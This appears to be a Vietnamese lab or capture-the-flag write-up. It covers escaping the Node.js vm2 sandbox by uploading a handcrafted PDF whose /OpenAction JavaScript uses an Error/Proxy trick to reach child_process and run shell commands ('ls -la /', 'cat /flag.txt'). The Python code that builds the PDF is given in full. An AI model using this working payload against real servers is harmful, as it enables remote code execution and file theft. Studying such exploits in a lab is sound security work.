

##  1. Ý tưởng 

Mục tiêu của bài Lab là khai thác lỗ hổng thoát khỏi môi trường Sandbox của thư viện **vm2** (Node.js) thông qua việc tải lên một tệp PDF tùy chỉnh.

**Cơ chế tấn công:**
1.  **PDF JavaScript:** Định dạng PDF hỗ trợ thực thi mã JavaScript tự động khi mở file thông qua thuộc tính `/OpenAction`.
2.  **Sandbox Escape:** Máy chủ sử dụng một trình xử lý PDF chạy JavaScript bên trong `vm2`. Chúng ta lợi dụng việc thiếu sót trong việc kiểm tra đối tượng `Error` kết hợp với `Proxy` để truy cập vào constructor của hệ thống, từ đó gọi module `child_process` để thực thi lệnh hệ điều hành (RCE).

---

##  2. Tiến trình thực nghiệm (Implementation)

### Bước 1: Thăm dò hệ thống (Reconnaissance)
Đầu tiên, chúng ta tạo một file PDF "thuần" nhất có thể (không qua thư viện để tránh bị thay đổi cấu trúc). Payload này thực hiện lệnh `ls -la /` để kiểm tra danh sách file trong thư mục gốc của server.

![image](https://github.com/user-attachments/assets/f19c9177-23c5-4cf1-8f74-8b4ebf743874)

**Mã nguồn tạo file `pwned.pdf`:**

```python
# Toàn bộ payload được nén thành 1 dòng và bọc trong (() => { ... })()
js_payload = '(() => { const err = new Error(); err.name = { toString: new Proxy(function(){}, { apply: function(t, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("ls -la /").toString(); } }) }; try { err.stack; } catch (a) { throw a; } })()'

# Tự tay dệt cấu trúc PDF thuần
pdf_content = f"""%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [ ] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS ({js_payload}) >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
"""

with open("pwned.pdf", "w") as f:
    f.write(pdf_content)
```

![image](https://github.com/user-attachments/assets/0f1ba5fd-9012-4e76-aa3a-84d95c396b6b)

---

### Bước 2: Tối ưu hóa kỹ thuật (Refining the Exploit)
Để đảm bảo kết quả từ lệnh hệ thống (stdout) được trả về chính xác cho chúng ta xem, chúng ta thay đổi cách xử lý lỗi. Thay vì `throw a;`, ta sử dụng `return a;` trong khối `catch` để lấy được dữ liệu output.

![image](https://github.com/user-attachments/assets/dac8b0e5-085a-40b0-87a2-9a068472742b)

**Payload đã sửa đổi (`pwned_return.pdf`):**

```javascript
// Payload đã được sửa: Thay "throw a;" thành "return a;" ở cuối để nhận kết quả
js_payload = '(() => { const err = new Error(); ... try { err.stack; } catch (a) { return a; } })()'
```

---

### Bước 3: Đọc File Flag (Exfiltrating the Flag)
Sau khi xác nhận lệnh `ls` đã thực thi thành công và thấy file flag, chúng ta đổi câu lệnh thành `cat /flag.txt` để đọc nội dung cờ.

![image](https://github.com/user-attachments/assets/78f288de-7bab-48c4-a8b8-c6b1c849f9dc)

**Mã nguồn cuối cùng (`get_flag.pdf`):**

```python
# Đã thay đổi "ls -la /" thành "cat /flag.txt"
js_payload = '(() => { const err = new Error(); err.name = { toString: new Proxy(function(){}, { apply: function(t, thiz, args) { const process = args.constructor.constructor("return process")(); const out = process.mainModule.require("child_process").execSync("cat /flag.txt").toString(); throw out; } }) }; try { err.stack; } catch (a) { return a; } })()'

# (Giữ nguyên cấu trúc PDF như trên)
```

---

##  3. Kết quả (Results)

Sau khi upload file `get_flag.pdf` lên server, ứng dụng xử lý tệp tin và vô tình kích hoạt mã độc JavaScript bên trong. Nhờ lỗ hổng của `vm2`, lệnh đọc file được thực thi và trả về Flag của bài thi.

---
